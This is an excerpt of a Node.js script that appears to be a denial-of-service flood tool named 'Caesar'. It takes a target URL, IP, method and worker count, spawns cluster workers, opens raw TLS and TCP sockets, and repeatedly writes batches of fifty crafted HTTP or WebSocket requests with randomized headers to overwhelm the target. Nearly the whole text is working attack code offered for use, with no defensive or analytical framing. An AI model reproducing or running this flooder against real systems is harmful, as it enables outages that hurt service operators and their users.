...
// npm install fs; npm install url; npm install path; npm install net ; npm install cluster ; npm install crypto ; npm install tls;
// node --max-old-space-size=88192 md5 "http" 11300 10 GET 1111
const fs = require('fs');
...
const numCPUs = process.argv[4];
var m = process.argv[5].toUpperCase();
var port = parsed.port;

const ip = process.argv[6];
...
if(!Boolean(ip)){
    console.log("Not attack server ipv4 Set ping",parsed.hostname);
    process.exit();
}
...
function BuildRequest() {
    ...
    if(m == 'WSS'){
        var acceptKey = randomBytes(16).toString('base64');
        var raw_socket = 'GET '+ parsed.path +' HTTP/1.1\r\n' +
            'Host: '+ parsed.host +'\r\n' +
            'Pragma: no-cache\r\n' +
            'Connection: Upgrade\r\n'+
            ...
            'Upgrade: websocket\r\n' +
            'Origin: https://gci.'+ RandomString(getRandomNumberBetween(5,7)) +'.com\r\n' +
        ...
        var raw_socket = ''+ m +' '+ parsed.path +' HTTP/1.1\r\n' +
            'Host: '+ parsed.host +'\r\n' +
            'Pragma: no-cache\r\n' +
            'Cache-Control: no-cache\r\n' +
...
if (cluster.isPrimary) {
    ...
    if(parsed.protocol == 'https:'){
        ...
        var int = setInterval(() => {
            ...
            //HTTPS
            var tlsx = require('tls');
            var tls = tlsx.connect({
                ...
                host: ip,
                port: port,
                // secureOptions: randomBytes.SSL_OP_NO_SSLv2 | randomBytes.SSL_OP_NO_SSLv3 | randomBytes.SSL_OP_NO_COMPRESSION, //'SSL_OP_*',
                ...
                for (let j = 0; j < 50; j++) {
                    tls.setKeepAlive(true, 5000)
                    tls.setTimeout(5000);
                    var xx = BuildRequest();
                    tls.write(xx);
                }

                tls.on('data', function () {
                    setTimeout(function () {
                        tls.destroy();
                        // return delete tls;
                    }, 100000);
        ...
        var int = setInterval(() => {
            ...
            for (var i = 0; i < 50; i++) {
                s.write(tx);
                // s.write(Buffer.from("303030303030303A2030613030203030303020303030302030303030203030306120202020202020202020202020202020202E2E2E2E2E2E2E2E2E2E0A", "hex"));
            }
            s.on('data', function () {
                setTimeout(function () {
                    s.destroy();
...
console.log('Caesar run ! method ==>',m,'Port ==>',port);
